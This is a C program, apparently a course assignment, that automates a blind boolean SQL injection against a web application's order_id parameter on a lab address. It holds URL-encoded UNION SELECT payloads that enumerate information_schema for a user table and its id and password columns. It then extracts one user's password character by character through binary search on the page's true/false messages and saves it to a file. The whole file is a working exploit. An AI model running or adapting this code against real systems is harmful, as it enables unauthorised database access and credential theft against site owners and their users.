#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

const char* WEB_APP_IP = "192.168.1.202";
const int HTTP_PORT = 80;

// 0 UNION SELECT 1 WHERE
// ASCII(SUBSTR((SELECT table_name
//       			FROM information_schema.tables
//       			WHERE table_schema='67607db'
//         			AND table_name LIKE '%usr%'
// 					LIMIT 0,1),@@@@@@@@@@@,1))>
const char* TABLE_NAME_PAYLOAD_URL =
    "0%20UNION%20SELECT%201%20WHERE%20ASCII%28SUBSTR%28%28SELECT%20table_name%20FROM%20information_schema.tables%20"
    "WHERE%20table_schema%3D%2767607db%27%20AND%20table_name%20LIKE%20%27%25usr%25%27%20"
    "LIMIT%200%2C1%29%2C@@@@@@@@@@@%2C1%29%29%3E";

// 0 UNION SELECT 1 WHERE
// ASCII(SUBSTR((SELECT column_name
//       			FROM information_schema.columns
//       			WHERE table_schema='67607db'
//         			AND table_name = '&&&&&&&&&&&'
//                  AND column_name LIKE '%id%'
// 					LIMIT 0,1),@@@@@@@@@@@,1))>
const char* ID_COLUMN_PAYLOAD_URL =
    "0%20UNION%20SELECT%201%20WHERE%20ASCII%28SUBSTR%28%28SELECT%20column_name%20"
    "FROM%20information_schema.columns%20"
    "WHERE%20table_schema%3D%2767607db%27%20"
    "AND%20table_name%3D%27&&&&&&&&&&&%27%20"
    "AND%20column_name%20LIKE%20%27%25id%25%27%20"
    "LIMIT%200%2C1%29%2C@@@@@@@@@@@%2C1%29%29%3E";

// 0 UNION SELECT 1 WHERE
// ASCII(SUBSTR((SELECT column_name
//       			FROM information_schema.columns
//       			WHERE table_schema='67607db'
//         			AND table_name = '&&&&&&&&&&&'
//                  AND column_name LIKE '%pwd%'
// 					LIMIT 0,1),@@@@@@@@@@@,1))>
const char* PWD_COLUMN_PAYLOAD_URL =
    "0%20UNION%20SELECT%201%20WHERE%20ASCII%28SUBSTR%28%28SELECT%20column_name%20"
    "FROM%20information_schema.columns%20"
    "WHERE%20table_schema%3D%2767607db%27%20"
    "AND%20table_name%3D%27&&&&&&&&&&&%27%20"
    "AND%20column_name%20LIKE%20%27%25pwd%25%27%20"
    "LIMIT%200%2C1%29%2C@@@@@@@@@@@%2C1%29%29%3E";

// 0 UNION SELECT 1 WHERE
// ASCII(SUBSTR((SELECT !!!!!!!!!!!
//       			FROM &&&&&&&&&&&
//       			WHERE ^^^^^^^^^^^ = '325000057'
// 					),@@@@@@@@@@@,1))>
const char* PWD_DETECT_URL =
    "0%20UNION%20SELECT%201%20WHERE%20ASCII%28SUBSTR%28%28SELECT%20!!!!!!!!!!!%20FROM%20&&&&&&&&&&&%20"
        "WHERE%20^^^^^^^^^^^%20%3D%20%27325000057%27%20%29%2C@@@@@@@@@@@%2C1%29%29%3E";

const char* BASIC_HTTP_REQUEST =
    "GET /index.php?order_id=%s%d HTTP/1.1\r\n"
    "Host: %s\r\n"
    "\r\n";

// 11 symbols of the marker cant collide with the table and columns names
// because the max legth of them is 10
const char* TABLE_NAME_MARKER = "&&&&&&&&&&&"; // 11 symbols of '&'
const char* INDEX_MARKER = "@@@@@@@@@@@"; // 11 symbols of '@'
const char* ID_COL_MARKER = "^^^^^^^^^^^"; // 11 symbols of '^'
const char* PWD_COL_MARKER = "!!!!!!!!!!!"; // 11 symbols of '!'
const char* FILE_NAME = "325000057.txt";

const int TABLE_MAX_LENGTH = 10;
const int ID_COL_MAX_LENGTH = 9;
const int PWD_C0L_MAX_LENGTH = 10;
const int PWD_MAX_LENGTH = 10;
const int VARIABLE_SIZE = 16;

#define TRUE_MSG "Your order has been sent!"
#define FALSE_MSG "Your order has not been sent yet."
#define BUF_SIZE 8192
#define PAYLOAD_SIZE 1024
#define REQUEST_SIZE 1024

int connect_tcp(const char *ip, int port) {
    // create a TCP socket
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
		perror("socket");
        exit(1);
    }
    struct sockaddr_in server; // struct to hold the web server's address
    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET; // IPv4 address
    server.sin_port = htons((uint16_t)port); // convert the port from host to nrtwork
    inet_pton(AF_INET, ip, &server.sin_addr); // convert the ip string to binary and store it
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("connect");
        exit(1);
    }
    // socket options as required
    int opt = 1;
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt,
    sizeof(opt)) < 0) {
        printf("setsockopt(SO_REUSEADDR) failed...\n");
        close(sock);
        exit(1);
    }
    opt = 1;
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt,
    sizeof(opt)) < 0) {
        printf("setsockopt(SO_REUSEPORT) failed...\n");
        close(sock);
        exit(1);
    }
    return sock;
}

void send_http_request(int sock, char *request) {
    // send an HTTP request to the web server to get one bit of information
    ssize_t sent = send(sock, request, strlen(request), 0);
    if (sent < 0) {
        perror("send");
        exit(1);
    }
}

int read_http_response(int sock, char *response) {
    // read the page returned from the web server, until we see the bit of informaton
    memset(response, 0, BUF_SIZE); // clear the response buffer
    ssize_t total = 0;
    // continuously read data from the socket
    while (1) {
        ssize_t n = recv(sock,response + total, (size_t)(BUF_SIZE - total - 1), 0);
        if (n <= 0)
            break;
        total += n;
		response[total] = '\0';
        // stop when the information bit appears
        if (strstr(response, TRUE_MSG) ||
            strstr(response, FALSE_MSG)) {
            break;
        }
    }
    return (int)total;
}

void replace_string(char *dst, size_t dst_size,
                    const char *src, const char *marker,
                    const char *value)
{
    // search for the first ocurrence of the marker  in the source
    const char *p = strstr(src, marker);
    if (!p) {
        exit(1);
    }
    // num of chars before the marker
    size_t prefix_len = (size_t)(p - src);
    // num of chars after the marker
    size_t suffix_len = strlen(p + strlen(marker));
    if (prefix_len + strlen(value) + suffix_len + 1 > dst_size) {
        exit(1);
    }
    // copy prefix to dest
    memcpy(dst, src, prefix_len);
    // copy the new value to dest after the prefix
    memcpy(dst + prefix_len, value, strlen(value));
    // copy suffix to dest after the value
    memcpy(dst + prefix_len + strlen(value),
           p + strlen(marker), suffix_len + 1);
}

int condition_true(int guess, int socket, const char* payload, char* response) {
    // create the request to send to the web server
    char request[REQUEST_SIZE];
    snprintf(request, sizeof(request), BASIC_HTTP_REQUEST, payload, guess, WEB_APP_IP);
    // send the request to the web server
    send_http_request(socket, request);
    // read the response until TRUE_MSG or FALSE_MSG appears
    read_http_response(socket, response);
    // return TRUE is the response includes the TRUE_MSG
    return strstr(response, TRUE_MSG) != NULL;
}


char binary_search_char(int sock, const char* payload, char* response, int pos) {
    // replace the "@@@@@@@@@@@" marker with the index of the char that we want to detect
    char new_payload[PAYLOAD_SIZE];
    // a temp variable to hold the string representation of the int value
    char value_str[VARIABLE_SIZE];
    // convert the integer value into a decimal string
    snprintf(value_str, sizeof(value_str), "%d", pos);
    replace_string(new_payload, sizeof(new_payload),
                    payload, INDEX_MARKER, value_str);
    //replace_marker_with_int(new_payload, sizeof(new_payload),
    //             payload, value_str, pos);
    int low = 32; // 32 in ASCII is ' '
    int high = 126; // 126 in ASCII is '~'
    // compute binary search to detect the right ASCII char
    while (low <= high) {
        int mid = (low + high) / 2;
        if (condition_true(mid, sock, new_payload, response)) {
            low = mid + 1;
        } else {
            high = mid - 1;
        }
    }
    return (char)low;
}

int has_char_at_pos(int sock, const char *payload, char *response, int pos) {
    // replace the "@@@@@@@@@@@" marker with the index of the char that we want to detect
    char new_payload[PAYLOAD_SIZE];
    // a temp variable to hold the string representation of the int value
    char value_str[VARIABLE_SIZE];
    // convert the integer value into a decimal string
    snprintf(value_str, sizeof(value_str), "%d", pos);
    replace_string(new_payload, sizeof(new_payload),
                    payload, INDEX_MARKER, value_str);
    //replace_marker_with_int(new_payload, sizeof(new_payload),
    //             payload, value_str, pos);

    // check: ASCII(...) > 0 ? (if ASCII(...) = 0 then we got to the end)
    return condition_true(0, sock, new_payload, response);
}

void detect_scheme_parameter(int sock, char *response, const int max_length, char * variable, const char* payload) {
    memset(variable, 0, (size_t)(max_length + 1));
    int pos = 1; // index of char we want to detect (starts at 1 instead of 0 in SQL)
    int idx = 0; // index of variable we build
    while (pos <= max_length) {
        // check if the we got the the end of the char
        if (!has_char_at_pos(sock, payload, response, pos)) {
            break;  // ASCII == 0 → end of variable name
        }
        char c = binary_search_char(sock, payload, response, pos);
        variable[idx++] = c;
        pos++;
    }
    variable[idx] = '\0';
}

void write_to_file(const char *filename, char *content) {
    // open a file
    FILE *f = fopen(filename, "w");
    if (!f) {
        perror("fopen");
        return;
    }
    // write the password into the file
    fputs(content, f);
    fclose(f);
}


int main() {
	// open a TCP connection to the web server
    int sock = connect_tcp(WEB_APP_IP, HTTP_PORT);

    // create a response buff to hold the web server's response
	char response[BUF_SIZE];

	// detect the table's name
    char table_name[TABLE_MAX_LENGTH + 1];
    detect_scheme_parameter(sock, response, TABLE_MAX_LENGTH, table_name, TABLE_NAME_PAYLOAD_URL);

    // detect the table's id column name
    char id_column_name[ID_COL_MAX_LENGTH + 1];
    char id_new_payload[PAYLOAD_SIZE];
    replace_string(id_new_payload, sizeof(id_new_payload),
                    ID_COLUMN_PAYLOAD_URL, TABLE_NAME_MARKER,
                    table_name);
    detect_scheme_parameter(sock, response, ID_COL_MAX_LENGTH, id_column_name, id_new_payload);

    // detect the table's pwd column name
    char pwd_column_name[PWD_C0L_MAX_LENGTH + 1];
    char pwd_col_new_payload[PAYLOAD_SIZE];
    replace_string(pwd_col_new_payload, sizeof(pwd_col_new_payload),
                    PWD_COLUMN_PAYLOAD_URL, TABLE_NAME_MARKER,
                    table_name);
    detect_scheme_parameter(sock, response, PWD_C0L_MAX_LENGTH, pwd_column_name, pwd_col_new_payload);

    // detect the password of id='325000057'
    char password[PWD_MAX_LENGTH + 3]; // +2 for '*' +1 for '\0'
    char pwd_payload_with_table[PAYLOAD_SIZE];
    char pwd_payload_with_id[PAYLOAD_SIZE];
    char pwd_payload_with_pwd[PAYLOAD_SIZE];
    // replace '$' with table_name in the url encoded payload
    replace_string(pwd_payload_with_table, sizeof(pwd_payload_with_table),PWD_DETECT_URL, TABLE_NAME_MARKER,
                    table_name);
    // replace '^' with id_col_name in the url encoded payload
    replace_string(pwd_payload_with_id, sizeof(pwd_payload_with_id),pwd_payload_with_table, ID_COL_MARKER,
                    id_column_name);
    // replace '!' with pwd_col_name in the url encoded payload
    replace_string(pwd_payload_with_pwd, sizeof(pwd_payload_with_pwd),pwd_payload_with_id, PWD_COL_MARKER,
                    pwd_column_name);
    detect_scheme_parameter(sock, response, PWD_MAX_LENGTH, password, pwd_payload_with_pwd);

    // add * to the start and end of the password
    char tmp[PWD_MAX_LENGTH + 3];  // +2 for '*' +1 for '\0'
    snprintf(tmp, sizeof(tmp), "*%s*", password);
    strncpy(password, tmp, sizeof(password));
    password[sizeof(password) - 1] = '\0';

    // write the password into the file
    write_to_file(FILE_NAME, password);

    close(sock);
    return 0;
}